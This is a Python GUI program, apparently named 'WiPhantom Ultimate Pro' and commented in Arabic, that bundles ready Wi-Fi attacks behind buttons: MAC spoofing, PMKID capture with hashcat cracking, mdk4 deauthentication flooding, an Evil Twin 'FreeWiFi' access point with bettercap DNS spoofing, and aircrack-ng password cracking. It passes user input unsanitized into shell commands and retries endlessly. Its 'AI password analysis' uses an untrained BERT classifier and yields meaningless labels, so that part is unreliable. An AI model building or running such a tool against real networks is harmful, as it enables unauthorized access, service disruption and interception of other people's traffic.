import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import os
import time
from transformers import pipeline

# تحميل نموذج الذكاء الاصطناعي (BERT)
password_analyzer = pipeline("text-classification", model="bert-base-uncased")

# دالة لتحليل كلمات المرور
def analyze_password(password):
    result = password_analyzer(password)
    return result[0]['label'], result[0]['score']

# دالة لتشغيل الأوامر في الخلفية
def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output.decode(), error.decode()

# دالة لتغيير MAC Address
def change_mac():
    interface = interface_entry.get()
    if not interface:
        messagebox.showerror("Error", "Please enter the wireless interface!")
        return
    output, error = run_command(f"ip link set {interface} down && macchanger -r {interface} && ip link set {interface} up")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)

# دالة لبدء وضع المراقبة
def start_monitor():
    interface = interface_entry.get()
    if not interface:
        messagebox.showerror("Error", "Please enter the wireless interface!")
        return
    output, error = run_command(f"airmon-ng start {interface}")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)

# دالة لبدء مسح الشبكات
def start_scan():
    interface = interface_entry.get()
    if not interface:
        messagebox.showerror("Error", "Please enter the wireless interface!")
        return
    output, error = run_command(f"timeout 20s airodump-ng {interface}mon")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)

# دالة لبدء هجوم PMKID
def start_pmkid_attack():
    interface = interface_entry.get()
    bssid = bssid_entry.get()
    if not interface or not bssid:
        messagebox.showerror("Error", "Please enter the wireless interface and BSSID!")
        return
    output, error = run_command(f"hcxdumptool -i {interface}mon -o pmkid.pcapng --enable_status=1 --filterlist_ap={bssid} --filtermode=2")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)
    if os.path.exists("pmkid.pcapng") and os.path.getsize("pmkid.pcapng") > 0:
        output, error = run_command("hcxpcapngtool -o hash.hc22000 pmkid.pcapng")
        result_text.insert(tk.END, output)
        result_text.insert(tk.END, error)
        output, error = run_command("hashcat -m 22000 hash.hc22000 /path/to/wordlist.txt --force")
        result_text.insert(tk.END, output)
        result_text.insert(tk.END, error)
    else:
        result_text.insert(tk.END, "[-] No PMKID captured, retrying...\n")
        threading.Thread(target=start_pmkid_attack).start()  # إعادة المحاولة

# دالة لبدء هجوم Deauthentication
def start_deauth_attack():
    interface = interface_entry.get()
    bssid = bssid_entry.get()
    if not interface or not bssid:
        messagebox.showerror("Error", "Please enter the wireless interface and BSSID!")
        return
    output, error = run_command(f"mdk4 {interface}mon d -b {bssid} &")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)
    time.sleep(30)
    run_command("killall mdk4")

# دالة لبدء هجوم Evil Twin
def start_evil_twin():
    interface = interface_entry.get()
    bssid = bssid_entry.get()
    channel = channel_entry.get()
    if not interface or not bssid or not channel:
        messagebox.showerror("Error", "Please enter the wireless interface, BSSID, and channel!")
        return
    output, error = run_command(f"airbase-ng -a {bssid} --essid 'FreeWiFi' -c {channel} {interface}mon &")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)
    output, error = run_command(f"bettercap -iface {interface}mon -eval 'set net.probe on; set net.recon on; dns.spoof on' &")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)
    time.sleep(60)
    run_command("killall airbase-ng bettercap")

# دالة لاستخراج كلمة مرور الشبكة
def crack_password():
    interface = interface_entry.get()
    bssid = bssid_entry.get()
    wordlist = wordlist_entry.get()
    if not interface or not bssid or not wordlist:
        messagebox.showerror("Error", "Please enter the wireless interface, BSSID, and wordlist path!")
        return
    output, error = run_command(f"aircrack-ng -w {wordlist} -b {bssid} handshake-01.cap")
    result_text.insert(tk.END, output)
    result_text.insert(tk.END, error)
    if "KEY FOUND" in output:
        result_text.insert(tk.END, "[+] Password found!\n")
    else:
        result_text.insert(tk.END, "[-] Password not found, retrying...\n")
        threading.Thread(target=crack_password).start()  # إعادة المحاولة

# دالة لتحليل كلمات المرور باستخدام الذكاء الاصطناعي
def analyze_passwords():
    password = password_entry.get()
    if not password:
        messagebox.showerror("Error", "Please enter a password to analyze!")
        return
    label, score = analyze_password(password)
    result_text.insert(tk.END, f"Password Analysis: {label} (Confidence: {score:.2f})\n")

# دالة لعرض حلول المشاكل
def show_solution(problem):
    solutions = {
        "الواجهة اللاسلكية غير موجودة": """
        - تأكد من أن كرت الشبكة اللاسلكية مثبت بشكل صحيح.
        - جرب إعادة تشغيل الجهاز أو توصيل الكرت بشكل صحيح.
        - استخدم الأمر التالي لتثبيت التعريفات:
          ```
          sudo apt install firmware-linux firmware-linux-nonfree
          ```
        """,
        "لا تظهر الشبكات في airodump-ng": """
        - تأكد من أن الواجهة في وضع المراقبة (Monitor Mode).
        - استخدم الأمر التالي لتفعيل وضع المراقبة:
          ```
          sudo airmon-ng start wlan0
          ```
        """,
        "لا يمكن كسر كلمة المرور": """
        - تأكد من أن لديك ملف Handshake أو PMKID.
        - تأكد من أن قائمة الكلمات تحتوي على كلمة المرور الصحيحة.
        """
    }
    result_text.delete(1.0, tk.END)  # مسح النتائج السابقة
    result_text.insert(tk.END, solutions.get(problem, "No solution found for this problem."))

# إنشاء واجهة المستخدم
root = tk.Tk()
root.title("WiPhantom Ultimate Pro")

# إطار الإدخال
input_frame = ttk.LabelFrame(root, text="Input Parameters", padding=10)
input_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")

# إدخال واجهة الشبكة
ttk.Label(input_frame, text="Wireless Interface:").grid(row=0, column=0, padx=5, pady=5)
interface_entry = ttk.Entry(input_frame)
interface_entry.grid(row=0, column=1, padx=5, pady=5)

# إدخال BSSID
ttk.Label(input_frame, text="BSSID:").grid(row=1, column=0, padx=5, pady=5)
bssid_entry = ttk.Entry(input_frame)
bssid_entry.grid(row=1, column=1, padx=5, pady=5)

# إدخال القناة
ttk.Label(input_frame, text="Channel:").grid(row=2, column=0, padx=5, pady=5)
channel_entry = ttk.Entry(input_frame)
channel_entry.grid(row=2, column=1, padx=5, pady=5)

# إدخال كلمة المرور
ttk.Label(input_frame, text="Password:").grid(row=3, column=0, padx=5, pady=5)
password_entry = ttk.Entry(input_frame)
password_entry.grid(row=3, column=1, padx=5, pady=5)

# إدخال مسار قائمة الكلمات
ttk.Label(input_frame, text="Wordlist Path:").grid(row=4, column=0, padx=5, pady=5)
wordlist_entry = ttk.Entry(input_frame)
wordlist_entry.grid(row=4, column=1, padx=5, pady=5)

# إطار التحكم
control_frame = ttk.LabelFrame(root, text="Controls", padding=10)
control_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew")

# أزرار التحكم
ttk.Button(control_frame, text="Change MAC", command=change_mac).grid(row=0, column=0, padx=5, pady=5)
ttk.Button(control_frame, text="Start Monitor", command=start_monitor).grid(row=0, column=1, padx=5, pady=5)
ttk.Button(control_frame, text="Start Scan", command=start_scan).grid(row=0, column=2, padx=5, pady=5)
ttk.Button(control_frame, text="PMKID Attack", command=start_pmkid_attack).grid(row=1, column=0, padx=5, pady=5)
ttk.Button(control_frame, text="Deauth Attack", command=start_deauth_attack).grid(row=1, column=1, padx=5, pady=5)
ttk.Button(control_frame, text="Evil Twin Attack", command=start_evil_twin).grid(row=1, column=2, padx=5, pady=5)
ttk.Button(control_frame, text="Crack Password", command=crack_password).grid(row=2, column=0, padx=5, pady=5)
ttk.Button(control_frame, text="Analyze Password", command=analyze_passwords).grid(row=2, column=1, padx=5, pady=5)

# إطار النتائج
result_frame = ttk.LabelFrame(root, text="Results", padding=10)
result_frame.grid(row=2, column=0, padx=10, pady=10, sticky="ew")

# منطقة عرض النتائج
result_text = tk.Text(result_frame, height=20, width=80)
result_text.grid(row=0, column=0, padx=5, pady=5)

# شريط المساعدة
help_frame = ttk.LabelFrame(root, text="Common Problems", padding=10)
help_frame.grid(row=0, column=1, rowspan=3, padx=10, pady=10, sticky="ns")

# قائمة المشاكل الشائعة
problems = [
    "الواجهة اللاسلكية غير موجودة",
    "لا تظهر الشبكات في airodump-ng",
    "لا يمكن كسر كلمة المرور"
]

# أزرار المشاكل
for problem in problems:
    ttk.Button(help_frame, text=problem, command=lambda p=problem: show_solution(p)).pack(fill=tk.X, padx=5, pady=5)

# تشغيل الواجهة
root.mainloop()
